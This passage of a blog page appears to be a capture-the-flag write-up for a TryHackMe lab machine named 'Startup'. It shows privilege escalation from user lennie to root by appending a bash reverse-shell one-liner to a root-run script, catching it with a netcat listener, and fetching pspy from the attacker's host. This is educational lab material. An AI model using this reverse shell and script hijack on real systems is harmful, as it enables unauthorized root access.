+drwx------ 5 lennie lennie 4.0K Nov 21 12:01 .
+drwxr-xr-x 3 root   root   4.0K Nov 12 04:53 ..
+drwx------ 2 lennie lennie 4.0K Nov 21 12:01 .cache
+drwxr-xr-x 2 lennie lennie 4.0K Nov 12 04:53 Documents
+drwxr-xr-x 2 root   root   4.0K Nov 12 04:54 scripts
+-rw-r--r-- 1 lennie lennie   38 Nov 12 04:53 user.txt
+lennie@startup:~$ cd Documents/
+lennie@startup:~/Documents$ ls -lah
+total 20K
+drwxr-xr-x 2 lennie lennie 4.0K Nov 12 04:53 .
+drwx------ 5 lennie lennie 4.0K Nov 21 12:01 ..
+-rw-r--r-- 1 root   root    139 Nov 12 04:53 concern.txt
+-rw-r--r-- 1 root   root     47 Nov 12 04:53 list.txt
+-rw-r--r-- 1 root   root    101 Nov 12 04:53 note.txt
+lennie@startup:~/Documents$ cat concern.txt 
+I got banned from your library for moving the "C programming language" book into the horror section. Is there a way I can appeal? --Lennie
+lennie@startup:~/Documents$ cat list.txt 
+Shoppinglist: Cyberpunk 2077 | Milk | Dog food
+lennie@startup:~/Documents$ cat note.txt 
+Reminders: Talk to Inclinant about our lacking security, hire a web developer, delete incident logs.
+lennie@startup:~/Documents$ 
+</code></pre>
+
+<p>Nothing to important and this stage so I looked at scripts.</p>
+
+<pre><code class="language-highlight">lennie@startup:~/Documents$ cd ..
+lennie@startup:~$ cd scripts/
+lennie@startup:~/scripts$ ls -lag
+total 16
+drwxr-xr-x 2 root   4096 Nov 12 04:54 .
+drwx------ 5 lennie 4096 Nov 21 12:01 ..
+-rwxr-xr-x 1 root     77 Nov 12 04:53 planner.sh
+-rw-r--r-- 1 root      1 Nov 21 12:07 startup_list.txt
+lennie@startup:~/scripts$ ls -lah
+total 16K
+drwxr-xr-x 2 root   root   4.0K Nov 12 04:54 .
+drwx------ 5 lennie lennie 4.0K Nov 21 12:01 ..
+-rwxr-xr-x 1 root   root     77 Nov 12 04:53 planner.sh
+-rw-r--r-- 1 root   root      1 Nov 21 12:07 startup_list.txt
+lennie@startup:~/scripts$ 
+</code></pre>
+
+<p>Two files both owned by root.</p>
+
+<pre><code class="language-highlight">lennie@startup:~/scripts$ cat startup_list.txt 
+
+lennie@startup:~/scripts$ cat planner.sh 
+#!/bin/bash
+echo $LIST &gt; /home/lennie/scripts/startup_list.txt
+/etc/print.sh
+lennie@startup:~/scripts$ 
+</code></pre>
+
+<p>It appears the planner.sh bash script echos the LIST variable to the startup_list.txt file, however the file is currently blank. Then it runs the script found at /etc/print.sh</p>
+
+<pre><code class="language-highlight">lennie@startup:~/scripts$ cat /etc/print.sh
+#!/bin/bash
+echo "Done!"
+lennie@startup:~/scripts$ ls -lah /etc/print.sh
+-rwx------ 1 lennie lennie 25 Nov 12 04:53 /etc/print.sh
+lennie@startup:~/scripts$ 
+</code></pre>
+
+<p>/etc/print.sh simply echos “Done!” however the user Lennie owns this file so we can edit the script and make it do what we want. Before I do that though I need to be sure that root will run the script regularly. To do that I use a tool called <a href="https://github.com/DominicBreuker/pspy">pspy</a>.</p>
+
+<p>I use python3 to start a quick http server: <em>sudo python3 -m http.server 80</em>. On the Startup machine I download pspy and execute.</p>
+
+<pre><code class="language-highlight">lennie@startup:~/scripts$ cd /dev/shm
+lennie@startup:/dev/shm$ wget http://(VPN IP)/pspy64
+--2020-11-21 12:13:38--  http://(VPN IP)/pspy64
+Connecting to 10.8.21.217:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3078592 (2.9M) [application/octet-stream]
+Saving to: ‘pspy64’
+
+pspy64                                      100%[=========================================================================================&gt;]   2.94M  1.60MB/s    in 1.8s
+
+2020-11-21 12:13:40 (1.60 MB/s) - ‘pspy64’ saved [3078592/3078592]
+
+lennie@startup:/dev/shm$ chmod +x pspy64 
+lennie@startup:/dev/shm$ 
+</code></pre>
+
+<p>pspy will now show all the processes running and the users associated.</p>
+
+<p><img src="/assets/images/startup/pspy.png" alt="pspy" /></p>
+
+<p>root is running the script regularly, I can determine its root as the UID is 0.</p>
+
+<pre><code class="language-highlight">lennie@startup:~/scripts$ cat /etc/print.sh
+#!/bin/bash
+echo "Done!"
+bash -i &gt;&amp; /dev/tcp/(VPN IP)/8888 0&gt;&amp;1
+lennie@startup:~/scripts$ 
+</code></pre>
+
+<p>I edit the print.sh script with a bash reverse shell one liner and wait for the script to execute.</p>
+
+<pre><code class="language-highlight">┌─[daz@parrot]─[~/Documents/TryHackMe/Startup]
+└──╼ $nc -nvlp 8888
+listening on [any] 8888 ...
+connect to [10.8.21.217] from (UNKNOWN) [10.10.27.29] 34830
+bash: cannot set terminal process group (2212): Inappropriate ioctl for device
+bash: no job control in this shell
+root@startup:~# cd /root
+cd /root
+root@startup:~# ls -lah
+ls -lah
+total 28K
+drwx------  4 root root 4.0K Nov 12 04:54 .
+drwxr-xr-x 25 root root 4.0K Nov 21 10:58 ..
+-rw-r--r--  1 root root 3.1K Oct 22  2015 .bashrc
+drwxr-xr-x  2 root root 4.0K Nov 12 04:54 .nano
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root   38 Nov 12 04:53 root.txt
+drwx------  2 root root 4.0K Nov 12 04:50 .ssh
+root@startup:~# 
+</code></pre>
+
+<p>Wait a few seconds and root shell! I really enjoyed this room, particularly the Wireshark element reviewing the capture to locate credentials.</p>
+
+<h3 id="secret-ingredient">Secret ingredient</h3>
+
+<p>I still need to find the secret ingredient from the recipe! This can be found at /recipe.txt</p>
+
+<pre><code class="language-highlight">$ cat recipe.txt
+Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was [redacted].
+</code></pre>
+
+<p>Thanks for reading!</p>
+
+                </div>
+            </section>
+
+            <!-- Email subscribe form at the bottom of the page -->
+            
+
+            <footer class="post-full-footer">
+                <!-- Everything inside the #author tags pulls data from the author -->
+            </footer>
+
+            <!-- If you use Disqus comments, just uncomment this block.
+            The only thing you need to change is "test-apkdzgmqhj" - which
+            should be replaced with your own Disqus site-id. -->
+            
+
+        </article>
+
+    </div>
+</main>
+
+
+
+        <!-- Previous/next page links - displayed on every page -->
+        
+
+        <!-- The footer at the very bottom of the screen -->
+        <footer class="site-footer outer">
+            <div class="site-footer-content inner">
+                <section class="copyright"><a href="https://darrynbrownfield.co.uk/">Darryn Brownfield</a> &copy; 2020</section>
+                <nav class="site-footer-nav">
+                    <a href="/">Latest Posts</a>
+                 </nav>
+            </div>
+        </footer>
+
+    </div>
+
+    <!-- The big email subscribe modal content -->
+    
+
+    <!-- highlight.js -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.10.0/components/prism-abap.min.js"></script>
+    <script>$(document).ready(function() {
+      $('pre code').each(function(i, block) {
+        hljs.highlightBlock(block);
+      });
+    });</script>
+
+    <!-- jQuery + Fitvids, which makes all video embeds responsive -->
+    <script
+        src="https://code.jquery.com/jquery-3.2.1.min.js"
+        integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
+        crossorigin="anonymous">
+    </script>
+    <script type="text/javascript" src="/assets/js/jquery.fitvids.js"></script>
+    <script type="text/javascript" src="https://demo.ghost.io/assets/js/jquery.fitvids.js?v=724281a32e"></script>
+
+
+    <!-- Paginator increased to "infinit" in _config.yml -->
+    <!-- if paginator.posts  -->
+    <!-- <script>
+        var maxPages = parseInt('');
+    </script>
+    <script src="/assets/js/infinitescroll.js"></script> -->
+    <!-- /endif -->
+
+    
+
+
+    <!-- Add Google Analytics  -->
+    <!-- Google Analytics Tracking code -->
+ <script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-175458891-1', 'auto');
+  ga('send', 'pageview');
+
+ </script>
+
+
+    <!-- The #block helper will pull in data from the #contentFor other template files. In this case, there's some JavaScript which we only want to use in post.hbs, but it needs to be included down here, after jQuery has already loaded. -->
+    
+        <script>
+
+// NOTE: Scroll performance is poor in Safari
+// - this appears to be due to the events firing much more slowly in Safari.
+//   Dropping the scroll event and using only a raf loop results in smoother
+//   scrolling but continuous processing even when not scrolling
+$(document).ready(function () {
+    // Start fitVids
+    var $postContent = $(".post-full-content");
+    $postContent.fitVids();
+    // End fitVids
+
+    var progressBar = document.querySelector('progress');
+    var header = document.querySelector('.floating-header');
+    var title = document.querySelector('.post-full-title');
+
+    var lastScrollY = window.scrollY;
+    var lastWindowHeight = window.innerHeight;
+    var lastDocumentHeight = $(document).height();
+    var ticking = false;
+
+    function onScroll() {
+        lastScrollY = window.scrollY;
+        requestTick();
+    }
+
+    function onResize() {
+        lastWindowHeight = window.innerHeight;
+        lastDocumentHeight = $(document).height();
+        requestTick();
+    }
+
+    function requestTick() {
+        if (!ticking) {
+            requestAnimationFrame(update);
+        }
+        ticking = true;
+    }
+
+    function update() {
+        var trigger = title.getBoundingClientRect().top + window.scrollY;
+        var triggerOffset = title.offsetHeight + 35;
+        var progressMax = lastDocumentHeight - lastWindowHeight;
+
+        // show/hide floating header
+        if (lastScrollY >= trigger + triggerOffset) {
+            header.classList.add('floating-active');
+        } else {
+            header.classList.remove('floating-active');
+        }
+
+        progressBar.setAttribute('max', progressMax);
+        progressBar.setAttribute('value', lastScrollY);
+
+        ticking = false;
+    }
+
+    window.addEventListener('scroll', onScroll, {passive: true});
+    window.addEventListener('resize', onResize, false);
+
+    update();
+});
+</script>
+
+    
+
+    <!-- Ghost outputs important scripts and data with this tag - it should always be the very last thing before the closing body tag -->
+    <!-- ghost_foot -->
+
+</body>
+</html>
